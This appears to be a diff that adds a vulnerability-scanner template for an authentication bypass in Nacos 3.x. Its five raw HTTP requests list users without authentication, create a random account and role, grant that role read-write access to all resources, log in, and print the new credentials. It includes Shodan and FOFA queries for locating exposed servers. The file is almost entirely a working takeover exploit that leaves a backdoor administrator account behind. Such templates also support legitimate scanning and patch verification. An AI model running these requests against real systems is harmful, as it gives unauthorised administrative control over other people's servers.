@@ -1,0 +1,115 @@
+id: nacos-v3-auth-scope-bypass
+
+info:
+  name: Nacos 3.x - Unauthenticated Admin Takeover
+  author: 0x_Akoko,mhtsec
+  severity: critical
+  description: |
+    Nacos 3.0.0 through 3.2.3 contains an authentication scope misassignment vulnerability. The user, role, and permission management API endpoints (UserControllerV3, RoleControllerV3, PermissionControllerV3) have @Secured annotations missing the apiType attribute, defaulting to OPEN_API scope which is guarded by nacos.core.auth.enabled disabled by default.
+  reference:
+    - https://github.com/mhtsec/nacos-authscope-poc
+    - https://github.com/alibaba/nacos/releases/tag/3.2.4
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-863
+  metadata:
+    verified: true
+    max-request: 5
+    vendor: alibaba
+    product: nacos
+    shodan-query: title:"Nacos"
+    fofa-query: title="Nacos"
+  tags: nacos,auth-bypass,unauth,takeover,intrusive,critical
+
+variables:
+  randuser: "{{rand_text_alpha(8)}}"
+  randrole: "{{rand_text_alpha(8)}}"
+  randpass: "P{{rand_base(6, 'acfhjnprx')}}Aa1"
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - raw:
+      - |
+        GET /nacos/v3/auth/user/list?pageNo=1&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "\"code\":0")'
+          - 'contains(body, "pageItems")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /nacos/v3/auth/user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{randuser}}&password={{randpass}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "create user ok!")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /nacos/v3/auth/role HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        role={{randrole}}&username={{randuser}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "add role ok!")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /nacos/v3/auth/permission HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        role={{randrole}}&resource=*%3A*&action=rw
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "add permission ok!")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 30s
+        POST /nacos/v3/auth/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{randuser}}&password={{randpass}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "accessToken")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"username:" + randuser + ":password:" + randpass'
+# digest: 490a00463044022011645bcf08b545d2c775f66ef5d71d3dfd74eb9746c1e74392c13076d730ff32022007034dec11d7da519c73a41f35ede8ab1c42c3433e9a1ca3147d016bd0fdc8e3:922c64590222798bb761d5b6d8e72950
